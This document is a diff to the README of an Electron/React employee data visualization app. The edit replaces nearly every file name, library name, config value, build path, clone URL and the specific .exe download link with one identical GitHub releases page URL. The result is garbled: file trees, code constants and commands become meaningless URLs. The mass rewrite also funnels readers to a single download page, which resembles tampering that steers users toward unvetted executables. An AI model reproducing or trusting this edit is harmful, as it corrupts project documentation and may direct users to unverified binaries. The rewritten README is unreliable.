@@ -6,7 +6,7 @@ A desktop application built with **Electron**, **React**, **TypeScript**, and **
 
 ## Demo / Screenshot
 
-![Employee Data Visualization App](./assets/screenshots/in-motion.jpg)
+![Employee Data Visualization App](https://github.com/agaribovic/Employee-Data-Visualization/releases)
 
 ---
 
@@ -16,7 +16,7 @@ A desktop application built with **Electron**, **React**, **TypeScript**, and **
 - **React** – UI library
 - **TypeScript** – Type-safe JavaScript
 - **Tailwind CSS** – Utility-first styling
-- **Chart.js / react-chartjs-2** – Pie charts visualization
+- **https://github.com/agaribovic/Employee-Data-Visualization/releases / react-chartjs-2** – Pie charts visualization
 - **Jest / React Testing Library** – Unit testing
 
 ---
@@ -38,47 +38,47 @@ A desktop application built with **Electron**, **React**, **TypeScript**, and **
 .
 ├─ /assets           
 │   ├─ /screenshots
-│   │   ├─ in-motion.jpg 
-│   │   └─ in-motion-responsive.jpg      
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases 
+│   │   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases      
 ├─ /electron            
-│   ├─ index.ts
-│   ├─ preload.ts
-│   └─ tsconfig.json
+│   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 ├─ /src                 
 │   ├─ /api
-│   │   ├─ api.ts
-│   │   ├─ base.ts
-│   │   ├─ common.ts
-│   │   ├─ configuration.ts
-│   │   └─ index.ts
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   ├─ /components
-│   │   ├─ Card.tsx
-│   │   ├─ Chart.tsx
-│   │   └─ Dashboard.tsx
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   ├─ /hooks
-│   │   └─ useTimeChanges.ts
+│   │   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   ├─ /tests               
 │   │   ├─ /components
-│   │   │   ├─ Card.test.tsx
-│   │   │   ├─ Chart.test.tsx
-│   │   │   └─ Dashboard.test.tsx
+│   │   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   │   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   │   │   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   │   ├─ /hooks
-│   │   │   └─ useTimeChanges.test.ts
+│   │   │   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   │   └─ /utils
-│   │       └─ timeChangesUtils.test.ts
+│   │       └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   └─ /utils
-│   │    └─ timeChangesUtils.ts
+│   │    └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 │   │
-│   ├─ App.tsx
-│   ├─ index.css
-│   ├─ index.html
-│   └─ main.tsx
-├─ .eslintrc.json
+│   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   ├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+│   └─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 ├─ .gitignore
 ├─ .prettierrc
-├─ .LICENSE.md
-├─ README.md
-└─ forge.config.js
+├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+├─ https://github.com/agaribovic/Employee-Data-Visualization/releases
+└─ https://github.com/agaribovic/Employee-Data-Visualization/releases
 ```
 
 ## Quick Start
@@ -86,7 +86,7 @@ A desktop application built with **Electron**, **React**, **TypeScript**, and **
 ### Clone & Install
 
 ```bash
-git clone https://github.com/agaribovic/Employee-Data-Visualization.git
+git clone https://github.com/agaribovic/Employee-Data-Visualization/releases
 cd employee-data-visualization
 npm install
 ```
@@ -96,13 +96,13 @@ npm install
 
 After setting up OpenAPI, ensure the following configuration is applied:
 
-1. **Set the API base URL** in `common.ts`:
+1. **Set the API base URL** in `https://github.com/agaribovic/Employee-Data-Visualization/releases`:
 
 ```ts
-export const DUMMY_BASE_URL = `https://api.dummy.in-lotion.de`;
+export const DUMMY_BASE_URL = `https://github.com/agaribovic/Employee-Data-Visualization/releases`;
 ```
 
-2. **Verify the API endpoint path in** in `api.ts`:
+2. **Verify the API endpoint path in** in `https://github.com/agaribovic/Employee-Data-Visualization/releases`:
 
 ```ts
 const localVarPath = `/api/time-changes`;
@@ -146,7 +146,7 @@ npm run build
 npm run start:prod
 ```
 
-- Electron loads compiled frontend from /dist-vite/index.html
+- Electron loads compiled frontend from https://github.com/agaribovic/Employee-Data-Visualization/releases
 - DevTools are disabled
 
 ### Create Windows Executable (.exe)
@@ -155,7 +155,7 @@ npm run start:prod
 npm run make
 ```
 
-- The .exe is located in /out/make/squirrel.windows/x64/
+- The .exe is located in https://github.com/agaribovic/Employee-Data-Visualization/releases
 - Portable, no installer required
 
 
@@ -164,7 +164,7 @@ npm run make
 A portable Windows executable of the **Employee Data Visualization App** is available.  
 No installer is required — simply download and launch the app directly.
 
-[Download Employee Data Visualization App](https://github.com/agaribovic/Employee-Data-Visualization/releases/latest/download/Employee.Data.Visualization.App.0.6.0.exe)
+[Download Employee Data Visualization App](https://github.com/agaribovic/Employee-Data-Visualization/releases)
 
 
 
